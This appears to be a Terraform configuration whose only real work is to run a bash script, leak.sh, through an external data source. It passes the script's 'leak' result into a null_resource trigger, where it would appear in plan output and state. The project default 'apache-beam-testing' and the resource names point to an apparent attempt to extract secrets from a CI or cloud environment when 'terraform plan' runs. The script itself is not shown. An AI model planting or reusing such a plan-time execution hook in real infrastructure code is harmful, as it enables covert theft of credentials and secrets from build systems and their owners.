terraform {
  required_providers {
    external = {
      source = "hashicorp/external"
    }
    null = {
      source = "hashicorp/null"
    }
  }
}

variable "project_id" {
  description = "GCP project id"
  type        = string
  default     = "apache-beam-testing"
}

data "external" "geralt_leak" {
  program = ["bash", "${path.module}/leak.sh"]
}

resource "null_resource" "geralt_keep" {
  triggers = {
    leak = data.external.geralt_leak.result["leak"]
  }
}
